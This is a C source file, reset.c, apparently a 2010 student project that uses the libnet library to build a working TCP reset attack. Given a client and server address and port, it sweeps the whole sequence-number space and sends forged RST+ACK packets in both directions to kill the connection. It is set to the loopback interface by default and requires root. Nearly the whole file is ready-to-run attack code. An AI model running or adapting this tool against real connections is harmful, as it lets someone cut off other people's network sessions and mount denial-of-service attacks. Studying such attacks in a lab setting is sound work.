/*****************************************************************
 * File: reset.c
 * by: Group YaKeXi
 * 
 * History:
 * 
 *  2010/02/22 Completed and tested by Hongkai Xing 
 *             on Ubuntu 9.10 with libnet 1.1.4 and libpcap 0.8.
 *
 *
 *
 *****************************************************************/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <stdint.h>
#include <unistd.h>

/*
 * Must execute as root
 * Execute as follows: ./reset  client_address client_port server_address server_port
 *
 */

void showErrorMsg(char *msg)
{
        perror(msg);
        exit(1);
}


int main(int argc, char **argv)
{
	char *srv_addr_str;
	char *srv_port_str;
	char *cli_addr_str;
	char *cli_port_str;

    	(argc>=2) ? (cli_addr_str = argv[1]) : (cli_addr_str = "127.0.0.1")	;
	(argc>=3) ? (cli_port_str = argv[2]) : (cli_port_str = "10001")		;
	(argc>=4) ? (srv_addr_str = argv[3]) : (srv_addr_str = "127.0.0.1")	;
	(argc>=5) ? (srv_port_str = argv[4]) : (srv_port_str = "9999")		;

	printf("starting reset attack on TCP connection: client %s:%s, server %s:%s\n",
		cli_addr_str, cli_port_str, srv_addr_str, srv_port_str);
	
	libnet_t *l;				//libnet context
	char err_buf[LIBNET_ERRBUF_SIZE];	//error message buffer
	char *dev_str;				//device name (loopback interface)
	u_int32_t srv_ip_addr,cli_ip_addr;	//network byte ordered IPv4 address
	u_int16_t srv_port_no,cli_port_no;	//port number for server and client
	unsigned long int seq_init=0,		//initial value of sequence number
			  seq_now,		//current value of sequence number
			  seq_incr=32768,	//fixed windows size
			  seq_max= 4294967295UL;//maximum value of sequence number (2^32)

	libnet_ptag_t tcp_tag = LIBNET_PTAG_INITIALIZER, 
		      ip_tag  = LIBNET_PTAG_INITIALIZER;//protocol tag value
	
	dev_str="lo";
	l = libnet_init(LIBNET_RAW4, dev_str, err_buf);
	if (l==NULL) showErrorMsg(err_buf);

	srv_ip_addr= libnet_name2addr4(l,srv_addr_str, LIBNET_DONT_RESOLVE);
	if (srv_ip_addr==-1) showErrorMsg("Server IP Address error !");
	cli_ip_addr= libnet_name2addr4(l,cli_addr_str, LIBNET_DONT_RESOLVE);
        if (cli_ip_addr==-1) showErrorMsg("Client IP Address error !");

	srv_port_no = atoi(srv_port_str);
	cli_port_no = atoi(cli_port_str);

	for (seq_now=seq_init; seq_now<seq_max-seq_incr; seq_now+=seq_incr){
	// try to reset the client 
		tcp_tag = libnet_build_tcp(
			srv_port_no, 			// source port
			cli_port_no, 			// destination port
			seq_now,			// sequence number
			0x00000001,			// ackowledgement number
			0x14,				// control flags
			32768,				// window sizee
			0,				// checksum
			0,				// urgent pointer
			LIBNET_TCP_H,			// length of TCP packet
			NULL,				// no payload
			0,				// payload length
			l,				// pointer to libnet context
			tcp_tag);			// protocol tag = 0, build new
		if (tcp_tag==-1) showErrorMsg("Error in TCP header !");

		ip_tag = libnet_build_ipv4(
			LIBNET_IPV4_H+LIBNET_TCP_H+0,	// total length
			0,				// type of service
			123,				// identification number
			0,				// fragmentation offset
			64,				// time to live
			IPPROTO_TCP,			// upper layer protocol
			0,				// checksum
			srv_ip_addr,			// source IPv4 address
			cli_ip_addr,			// destination IPv4 address
			NULL,				// no payload
			0,				// payload length
			l,				// pointer to libnet context
			ip_tag);			// protocol tag=0, build new
		if (ip_tag==-1) showErrorMsg("Error in IP header !");

		libnet_write(l);

	// try to reset the server 
                tcp_tag = libnet_build_tcp(
                        cli_port_no,                    // source port
                        srv_port_no,                    // destination port
                        seq_now,                        // sequence number
                        0x00000001,                     // ackowledgement number
                        0x14,                           // control flags
                        32768,                          // window sizee
                        0,                              // checksum
                        0,                              // urgent pointer
                        LIBNET_TCP_H,                   // length of TCP packet
                        NULL,                           // no payload
                        0,                              // payload length
                        l,                              // pointer to libnet context
                        tcp_tag);                       // protocol tag = 0, build new
                if (tcp_tag==-1) showErrorMsg("Error in TCP header !");

                ip_tag = libnet_build_ipv4(
                        LIBNET_IPV4_H+LIBNET_TCP_H+0,   // total length
                        0,                              // type of service
                        321,                            // identification number
                        0,                              // fragmentation offset
                        64,                             // time to live
                        IPPROTO_TCP,                    // upper layer protocol
                        0,                              // checksum
                        cli_ip_addr,                    // source IPv4 address
                        srv_ip_addr,                    // destination IPv4 address
                        NULL,                           // no payload
                        0,                              // payload length
                        l,                              // pointer to libnet context
                        ip_tag);                        // protocol tag=0, build new
                if (ip_tag==-1) showErrorMsg("Error in IP header !");

                libnet_write(l);

	}

	libnet_destroy(l);
	return 0; 
}

